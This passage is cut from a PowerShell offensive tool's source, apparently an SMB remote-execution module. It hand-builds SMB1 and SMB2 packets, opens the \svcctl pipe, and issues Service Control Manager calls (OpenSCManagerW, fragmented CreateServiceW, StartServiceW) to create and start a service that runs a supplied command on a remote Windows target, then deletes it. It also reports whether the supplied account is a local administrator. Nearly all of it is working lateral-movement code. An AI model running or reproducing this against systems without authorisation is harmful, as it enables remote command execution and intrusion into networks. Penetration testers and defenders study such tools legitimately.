                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadAndXRequest'
                        $SMB_client_stage_next = 'CloseServiceHandle'
                        $SMB_close_service_handle_stage = 1
                    }

                    'CloseServiceHandle'
                    {
                        if($SMB_close_service_handle_stage -eq 1)
                        {
                            Write-Verbose "Service $SMB_service deleted on $Target"
                            $SMB_close_service_handle_stage++
                            $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_context_handle
                        }
                        else
                        {
                            $SMB_client_stage = 'CloseRequest'
                            $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_manager_context_handle
                        }
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x05,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                    }

                    'CloseRequest'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x04 0x18 0x07,0xc8 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBCloseRequest 0x00,0x40
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'TreeDisconnect'
                    }

                    'TreeDisconnect'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x71 0x18 0x07,0xc8 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBTreeDisconnectRequest
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'Logoff'
                    }

                    'Logoff'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x74 0x18 0x07,0xc8 0x34,0xfe $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBLogoffAndXRequest
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'Exit'
                    }

                }
            
                if($SMBExec_failed)
                {
                    BREAK SMB_execute_loop
                }
            
            }

        }  
        else
        {
            
            $SMB_client_stage = 'TreeConnect'

            :SMB_execute_loop while ($SMB_client_stage -ne 'exit')
            {

                switch ($SMB_client_stage)
                {
            
                    'TreeConnect'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00

                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SMB2_data = New-PacketSMB2TreeConnectRequest $SMB_path_bytes
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                        try
                        {
                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                            $SMB_client_stream.Flush()
                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                            $SMB_client_stage = 'CreateRequest'
                        }
                        catch
                        {
                            Write-Output "[-] Session connection is closed"
                            $SMB_client_stage = 'Exit'
                        }
                        
                    }
                  
                    'CreateRequest'
                    {
                        #$SMB2_tree_ID = 0x01,0x00,0x00,0x00
                        $SMB2_tree_ID = $SMB_client_receive[40..43]
                        $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SMB2_data = New-PacketSMB2CreateRequestFile $SMB_named_pipe_bytes
                        $packet_SMB2_data["Share_Access"] = 0x07,0x00,0x00,0x00  
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data  
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data  
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                        try
                        {
                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                            $SMB_client_stream.Flush()
                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        }
                        catch
                        {
                            Write-Output "[-] Session connection is closed"
                            $SMB_client_stage = 'Exit'
                        }

                        if($Refresh -and $SMB_client_stage -ne 'Exit')
                        {
                            Write-Output "[+] Session refreshed"
                            $SMB_client_stage = 'Exit'
                        }
                        elseif($SMB_client_stage -ne 'Exit')
                        {
                            $SMB_client_stage = 'RPCBind'
                        }

                    }
                
                    'RPCBind'
                    {
                        $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl
                        $SMB_file_ID = $SMB_client_receive[132..147]
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_RPC_data = New-PacketRPCBind 1 0xb8,0x10 0x01 0x00,0x00 $SMB_named_pipe_UUID 0x02,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadRequest'
                        $SMB_client_stage_next = 'OpenSCManagerW'
                    }
               
                    'ReadRequest'
                    {

                        Start-Sleep -m $Sleep
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x08,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
                        $packet_SMB2_header["CreditCharge"] = 0x10,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SMB2_data = New-PacketSMB2ReadRequest $SMB_file_ID
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '03-01-00-00')
                        {
                            $SMB_client_stage = $SMB_client_stage_next
                        }
                        else
                        {
                            $SMB_client_stage = 'StatusPending'
                        }

                    }

                    'StatusPending'
                    {
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '03-01-00-00')
                        {
                            $SMB_client_stage = $SMB_client_stage_next
                        }

                    }
                
                    'OpenSCManagerW'
                    {
                        $SMB2_message_ID += 23
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SCM_data = New-PacketSCMOpenSCManagerW $SMB_service_bytes $SMB_service_length
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadRequest'
                        $SMB_client_stage_next = 'CheckAccess'        
                    }

                    'CheckAccess'
                    {

                        if([System.BitConverter]::ToString($SMB_client_receive[128..131]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($SMB_client_receive[108..127]) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')
                        {

                            $SMB_service_manager_context_handle = $SMB_client_receive[108..127]
                            
                            if($SMB_execute -eq $true)
                            {
                                Write-Verbose "$output_username is a local administrator on $Target"
                                $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes
                                $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                                if($SCM_data.Length -lt $SMB_split_index)
                                {
                                    $SMB_client_stage = 'CreateServiceW'
                                }
                                else
                                {
                                    $SMB_client_stage = 'CreateServiceW_First'
                                }

                            }
                            else
                            {
                                Write-Output "$output_username is a local administrator on $Target"
                                $SMB2_message_ID += 20
                                $SMB_close_service_handle_stage = 2
                                $SMB_client_stage = 'CloseServiceHandle'
                            }

                        }
                        elseif([System.BitConverter]::ToString($SMB_client_receive[128..131]) -eq '05-00-00-00')
                        {
                            Write-Output "$output_username is not a local administrator or does not have required privilege on $Target"
                            $SMBExec_failed = $true
                        }
                        else
                        {
                            Write-Output "Something went wrong with $Target"
                            $SMBExec_failed = $true
                        }

                    }
                
                    'CreateServiceW'
                    {
                        
                        if($SMBExec_command_bytes.Length -lt $SMB_split_index)
                        {
                            $SMB2_message_ID += 20
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                            $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                            $SMB_client_stream.Flush()
                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                            $SMB_client_stage = 'ReadRequest'
                            $SMB_client_stage_next = 'StartServiceW'
                        }
                        else
                        {
                            
                            
                        }
                    }

                    'CreateServiceW_First'
                    {
                        $SMB_split_stage_final = [Math]::Ceiling($SCM_data.Length / $SMB_split_index)
                        $SMB2_message_ID += 20
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
                        
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $SCM_data_first = $SCM_data[0..($SMB_split_index - 1)]
                        $packet_RPC_data = New-PacketRPCRequest 0x01 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_first
                        $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length)
                        $SMB_split_index_tracker = $SMB_split_index
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if($SMB_split_stage_final -le 2)
                        {
                            $SMB_client_stage = 'CreateServiceW_Last'
                        }
                        else
                        {
                            $SMB_split_stage = 2
                            $SMB_client_stage = 'CreateServiceW_Middle'
                        }

                    }

                    'CreateServiceW_Middle'
                    {
                        $SMB_split_stage++
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
                        
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $SCM_data_middle = $SCM_data[$SMB_split_index_tracker..($SMB_split_index_tracker + $SMB_split_index - 1)]
                        $SMB_split_index_tracker += $SMB_split_index
                        $packet_RPC_data = New-PacketRPCRequest 0x00 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_middle
                        $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length - $SMB_split_index_tracker + $SMB_split_index)
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if($SMB_split_stage -ge $SMB_split_stage_final)
                        {
                            $SMB_client_stage = 'CreateServiceW_Last'
                        }
                        else
                        {
                            $SMB_client_stage = 'CreateServiceW_Middle'
                        }

                    }

                    'CreateServiceW_Last'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
                        
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $SCM_data_last = $SCM_data[$SMB_split_index_tracker..$SCM_data.Length]
                        $packet_RPC_data = New-PacketRPCRequest 0x02 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_last
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadRequest'
                        $SMB_client_stage_next = 'StartServiceW'
                    }

                    'StartServiceW'
                    {
                    
                        if([System.BitConverter]::ToString($SMB_client_receive[132..135]) -eq '00-00-00-00')
                        {
                            Write-Verbose "Service $SMB_service created on $Target"
                            $SMB_service_context_handle = $SMB_client_receive[112..131]
                            $SMB2_message_ID += 20
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                            $packet_SMB2_header["CreditRequest"] = 0x7f,0x00
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_SCM_data = New-PacketSCMStartServiceW $SMB_service_context_handle
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data   
                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
